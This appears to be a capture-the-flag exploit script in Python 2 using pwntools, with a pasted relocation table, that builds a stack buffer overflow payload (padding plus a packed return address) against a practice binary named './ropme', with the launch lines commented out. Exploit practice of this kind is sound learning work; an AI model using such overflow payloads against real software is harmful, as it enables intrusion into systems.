#0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
#0000000000601028 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
#0000000000601030 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5
#0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
#0000000000601050 R_X86_64_COPY     stdout@@GLIBC_2.2.5
#0000000000601060 R_X86_64_COPY     stdin@@GLIBC_2.2.5
#0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5

#from struct import pack
from pwn import *
import struct

system=p64(0xbeaffeab)
#buf=struct.pack("< Q", 0x7fffffffdc00)

binsh=p64(0x7ffff7b99d57)
pad="A"*(64)
exp=""
exp+=pad+"BBBBBBB"+p64(0xbeaffeab)
print exp

# p=process("./ropme")
# p.send(exp)


# p.interactive()